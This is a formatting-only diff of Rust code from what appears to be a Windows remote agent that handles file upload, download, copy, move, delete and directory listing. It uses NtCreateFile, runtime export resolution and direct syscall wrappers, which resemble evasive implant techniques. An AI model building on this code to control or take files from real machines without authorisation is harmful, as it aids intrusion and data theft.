@@ -534,12 +534,13 @@ fn do_upload_open(rt: &Runtime, name: &str) -> Result<*mut core::ffi::c_void, Re
         ) {
             Ok(h) => Ok(h),
             Err(OpenError::BadPath) => Err(Response::Err(String::from("upload: invalid path"))),
-            Err(OpenError::Unresolved) => {
-                Err(Response::Err(String::from("upload: NtCreateFile unresolved")))
-            }
-            Err(OpenError::Status(s)) => {
-                Err(Response::Err(String::from(format_ntstatus("upload open", s))))
-            }
+            Err(OpenError::Unresolved) => Err(Response::Err(String::from(
+                "upload: NtCreateFile unresolved",
+            ))),
+            Err(OpenError::Status(s)) => Err(Response::Err(String::from(format_ntstatus(
+                "upload open",
+                s,
+            )))),
         }
     }
 }
@@ -690,11 +691,7 @@ fn do_download_open(rt: &Runtime, path: &str) -> Result<*mut core::ffi::c_void, 
 /// single empty chunk with eof=1 (matches the dev agent); the last chunk is
 /// marked eof=1. Read errors are returned as-is; `do_download` closes the
 /// handle exactly once on every path.
-fn do_download_read_all(
-    rt: &Runtime,
-    handle: *mut core::ffi::c_void,
-    path: &str,
-) -> Vec<Response> {
+fn do_download_read_all(rt: &Runtime, handle: *mut core::ffi::c_void, path: &str) -> Vec<Response> {
     let mut chunks: Vec<Response> = Vec::new();
     let mut buf = crate::heap::vec![0u8; CHUNK];
     let name = basename(path);
@@ -936,7 +933,11 @@ fn fileop_rm_resolve() -> Result<(DeleteFileW, RemoveDirectoryW), Response> {
     let rmdir: RemoveDirectoryW =
         match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return Err(Response::Err(String::from("rm: RemoveDirectoryW unresolved"))),
+            None => {
+                return Err(Response::Err(String::from(
+                    "rm: RemoveDirectoryW unresolved",
+                )))
+            }
         };
     let _ = unsafe {
         // Touch the type to keep it resolved-but-unused (GetFileAttributesW is
@@ -1076,11 +1077,7 @@ fn fileop_mv_open(rt: &Runtime, path: &str) -> Result<*mut core::ffi::c_void, Re
 /// +pad:7 +RootDirectory:8 +FileNameLength:4 = 20) before FileName[].
 /// NtSetInformationFile needs Length >= 20 + FileNameLength to read the
 /// whole name; the old `16 + ...` was 4 short and truncated the rename.
-fn fileop_mv_rename(
-    rt: &Runtime,
-    handle: *mut core::ffi::c_void,
-    destbuf: &[u16],
-) -> Response {
+fn fileop_mv_rename(rt: &Runtime, handle: *mut core::ffi::c_void, destbuf: &[u16]) -> Response {
     unsafe {
         let mut info: FileRenameInformation = core::mem::zeroed();
         info.replace_if_exists = 1;
@@ -1138,9 +1135,13 @@ fn fileop_cp_read_all(rt: &Runtime, path: &str) -> Result<Vec<Vec<u8>>, Response
             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
         ) {
             Ok(h) => h,
-            Err(OpenError::BadPath) => return Err(Response::Err(String::from("cp: invalid src path"))),
+            Err(OpenError::BadPath) => {
+                return Err(Response::Err(String::from("cp: invalid src path")))
+            }
             Err(OpenError::Unresolved) => {
-                return Err(Response::Err(String::from("cp: src NtCreateFile unresolved")))
+                return Err(Response::Err(String::from(
+                    "cp: src NtCreateFile unresolved",
+                )))
             }
             Err(OpenError::Status(s)) => {
                 return Err(Response::Err(String::from(format_ntstatus("cp src", s))))
@@ -1162,7 +1163,9 @@ fn fileop_cp_read_all(rt: &Runtime, path: &str) -> Result<Vec<Vec<u8>>, Response
             // instead of appending a partial chunk.
             if status < 0 {
                 let _ = crate::syscalls::nt_close(rt, handle as usize);
-                return Err(Response::Err(String::from(format_ntstatus("cp read", status))));
+                return Err(Response::Err(String::from(format_ntstatus(
+                    "cp read", status,
+                ))));
             }
             out.push(buf[..got].to_vec());
         }
@@ -1306,10 +1309,7 @@ fn fileop_ls_open(rt: &Runtime, path: &str) -> Result<*mut core::ffi::c_void, Re
 /// building the one-entry-per-line output (directories suffixed with '/').
 /// Closes the handle itself on error (mirrors the original loop's cleanup);
 /// the caller closes it on success.
-fn fileop_ls_enumerate(
-    rt: &Runtime,
-    handle: *mut core::ffi::c_void,
-) -> Result<String, Response> {
+fn fileop_ls_enumerate(rt: &Runtime, handle: *mut core::ffi::c_void) -> Result<String, Response> {
     let mut buf = crate::heap::vec![0u8; DIR_BUF];
     let mut out = String::new();
     let mut restart = RETURN_SINGLE_ENTRY_TRUE;
@@ -1394,20 +1394,12 @@ fn fileop_ls_append_entries(out: &mut String, buf: &[u8], got: usize) {
         let mut off = 0usize;
         while off + 64 <= got {
             let next_off =
-                u32::from_le_bytes([buf[off], buf[off + 1], buf[off + 2], buf[off + 3]])
+                u32::from_le_bytes([buf[off], buf[off + 1], buf[off + 2], buf[off + 3]]) as usize;
+            let attrs =
+                u32::from_le_bytes([buf[off + 56], buf[off + 57], buf[off + 58], buf[off + 59]]);
+            let name_len =
+                u32::from_le_bytes([buf[off + 60], buf[off + 61], buf[off + 62], buf[off + 63]])
                     as usize;
-            let attrs = u32::from_le_bytes([
-                buf[off + 56],
-                buf[off + 57],
-                buf[off + 58],
-                buf[off + 59],
-            ]);
-            let name_len = u32::from_le_bytes([
-                buf[off + 60],
-                buf[off + 61],
-                buf[off + 62],
-                buf[off + 63],
-            ]) as usize;
             // Clamp to what the buffer actually holds and keep it even
             // (WCHAR units); a truncated tail is dropped, not misread.
             let name_bytes = (name_len.min(got.saturating_sub(off + 64)) / 2) * 2;
